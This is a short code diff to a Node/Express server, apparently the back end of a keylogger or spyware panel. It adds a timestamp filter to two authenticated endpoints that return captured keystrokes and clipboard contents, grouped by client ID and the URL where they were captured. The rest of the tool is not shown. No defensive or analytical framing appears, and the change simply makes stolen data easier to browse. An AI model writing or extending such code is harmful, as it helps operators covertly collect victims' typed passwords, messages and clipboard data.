@@ -1019,8 +1019,10 @@ app.get('/api/keystrokes', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 100, 1000);
     const cid = req.query.clientId;
     const search = (req.query.search || '').toLowerCase();
+    const since = req.query.since ? parseInt(req.query.since) : null;
     let d = store.keystrokes;
     if (cid) d = d.filter(k => k.clientId === cid);
+    if (since) d = d.filter(k => new Date(k.timestamp || 0).getTime() > since);
     if (search) d = d.filter(k => (k.keys || '').toLowerCase().includes(search) || (k.url || '').toLowerCase().includes(search));
     res.json(d.slice(0, limit));
 });
@@ -1029,8 +1031,10 @@ app.get('/api/clipboard', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 50, 500);
     const cid = req.query.clientId;
     const search = (req.query.search || '').toLowerCase();
+    const since = req.query.since ? parseInt(req.query.since) : null;
     let d = store.clipboard;
     if (cid) d = d.filter(c => c.clientId === cid);
+    if (since) d = d.filter(c => new Date(c.timestamp || 0).getTime() > since);
     if (search) d = d.filter(c => (c.text || '').toLowerCase().includes(search) || (c.url || '').toLowerCase().includes(search));
     res.json(d.slice(0, limit));
 });
